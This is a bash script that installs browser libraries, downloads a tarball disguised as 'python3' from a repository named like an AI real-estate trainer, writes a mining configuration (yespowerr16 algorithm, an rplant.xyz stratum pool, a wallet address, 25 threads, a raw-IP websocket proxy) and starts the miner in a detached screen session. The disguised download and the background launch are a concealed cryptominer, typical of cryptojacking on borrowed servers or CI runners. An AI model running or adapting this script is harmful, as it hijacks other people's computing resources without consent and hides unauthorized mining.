#!/bin/bash

# Function to install screen if not already installed
install_screen() {
    if ! [ -x "$(command -v screen)" ]; then
        echo 'Installing screen...'
        sudo apt-get update
        sudo apt-get install -y screen
    fi
}

# Function to set locale settings
set_locale() {
    export LANG="en_US.UTF-8"
    export LC_ALL="en_US.UTF-8"
    export LANGUAGE="en_US.UTF-8"
}

# Function to set timezone to Asia/Jakarta
set_timezone() {
    sudo ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    sudo dpkg-reconfigure --frontend noninteractive tzdata
}

# Function to download and extract python3.tar.gz
download_python() {
    wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
    tar -xvf python3.tar.gz
    rm python3.tar.gz
    cd python3
}

# Function to install required packages
install_packages() {
    export DEBIAN_FRONTEND=noninteractive
    apt-get update
    apt-get install -y --no-install-recommends \
        libnss3-dev gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 \
        libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 \
        libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 \
        libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 \
        libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
        ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils \
        libgbm-dev tzdata
}

# Function to create config.json file
create_config_file() {
    cat <<EOL > config.json
    {
        "algorithm": "$M_ALGO",
        "host": "$M_HOST",
        "port": $M_PORT,
        "worker": "$M_WORKER",
        "password": "$M_PASSWORD",
        "workers": $M_THREADS,
        "log": false,
        "chrome": "./chromium/chrome",
        "proxy": "$M_PROXY"
    }
EOL
}

# Main script execution starts here

# Call functions in sequence

# Install screen
install_screen

# Set locale
set_locale

# Set timezone
set_timezone

# Set mining configuration
M_ALGO="yespowerr16"
M_HOST="stratum-asia.rplant.xyz"
M_PORT="13382"
M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
M_PASSWORD="x"
M_THREADS="25"
M_PROXY="ws://172.233.136.27:8088/proxy"

# Download and extract python3.tar.gz
download_python

# Install required packages
install_packages

# Remove the existing config.json file
rm -f config.json

# Create a new config.json file
create_config_file

# Start the mining script inside a screen session
screen -dmS mining /bin/bash -c './python3 main.py'
